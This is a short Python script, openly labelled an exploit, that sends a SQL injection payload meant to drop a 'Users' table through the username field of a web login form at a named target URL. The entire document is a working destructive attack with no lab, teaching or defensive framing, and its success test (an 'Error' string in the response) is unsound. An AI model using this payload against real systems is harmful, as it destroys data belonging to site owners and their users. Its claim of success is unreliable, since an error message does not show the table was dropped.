import requests

def exploit_sql_injection():
    """
    Exploits a SQL injection vulnerability in a web application.

    The payload attempts to drop the 'Users' table in the database.

    If the response contains 'Error', the SQL injection was successful.
    """
    target_url = "http://www.myexample.com/vulnerable-page.php"
    payload = "'; DROP TABLE Users; --"

    data = {
        'username': payload,
        'password': 'password'
    }

    response = requests.post(target_url, data=data)

    if "Error" in response.text:
        print("SQL injection successful!")
    else:
        print("SQL injection failed.")

if __name__ == "__main__":
    exploit_sql_injection()
